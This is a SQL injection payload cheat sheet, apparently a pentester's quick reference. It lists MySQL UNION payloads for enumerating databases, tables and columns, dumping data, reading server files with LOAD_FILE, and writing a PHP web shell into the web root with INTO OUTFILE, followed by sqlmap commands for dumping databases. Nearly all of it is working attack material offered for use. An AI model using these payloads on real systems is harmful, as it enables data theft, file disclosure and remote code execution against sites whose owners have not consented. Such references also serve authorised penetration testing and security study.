Payload

Quick Ref

What it doesMySQL Query
Enumerate ColumnsORDER BY 1,2,3 -- -
Enumerate Reflected ColumnsUNION 1,2,3... -- -
Enumerate DB VersionUNION SELECT 1,@@version,3+--+-
Enumerate Current DBUNION SELECT 1,database(),3+--+-
Enumerate All DBUNION SELECT 1,group_concat("database:",SCHEMA_NAME,"\n"),3 FROM information_schema.schemata -- -
Enumerate Tables in chosen DBUNION SELECT 1,group_concat("table:",table_name,"\n"),3 FROM information_schema.tables WHERE table_schema='<specify DB>' -- -
Dump entries of specified ColumnsUNION SELECT 1,group_concat(<column1>,<column2>),3 FROM <specify DB>.<specify Table> -- -
Load File (LFI)UNION SELECT 1,TO_base64(LOAD_FILE('/var/www/html/<specify file>')),3 -- -
Insert ShellUNION SELECT 1,"<?php+system($_GET['cmd'])?>",3 INTO OUTFILE "/var/www/html/shell.php" -- -

DB Data

  1. Dump databases
    1

     sqlmap -r sqli.txt -p <parameter> --dbs --output-dir=$(pwd)/sqlmap
  2. Dump tables
    1

     sqlmap -r sqli.txt -p <parameter> -D <dbs> --tables --output-dir=$(pwd)/sqlmap
  3. Dump columns
    1

     sqlmap -r sqli.txt -p <parameter> -D <dbs> -T <table> --columns --dump --output-dir=$(pwd)/sqlmap
  4. Dump specific columns
    1

     sqlmap -r sqli.txt -p <parameter> -D <dbs> -T <table> -C <column1,column2> --dump --output-dir=$(pwd)/sqlmap
  5. Try levels
    1

     --level=5 --risk=3
  6. Proxy
    1

      --proxy=http://192.168.110.27:31337/
